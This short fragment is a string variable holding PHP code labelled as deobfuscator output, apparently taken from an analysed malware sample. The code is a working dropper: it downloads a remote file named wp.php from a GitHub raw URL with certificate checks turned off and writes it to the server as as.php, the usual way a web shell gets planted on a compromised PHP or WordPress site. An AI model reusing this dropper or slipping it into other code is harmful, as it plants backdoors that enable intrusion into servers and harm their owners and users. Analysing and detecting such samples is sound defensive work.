    data2 = "<?php 
/* #1: PHPDeobfuscator eval output */ 
    function adminer($url, $isi)
    {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
    }
    if (adminer("https://raw.githubusercontent.com/Xi4u7/just-for-fun/master/wp.php", "as.php")) {
        echo "Sukses";
    } else {
        echo "fail";
    }
/* END:#1 */
?>"

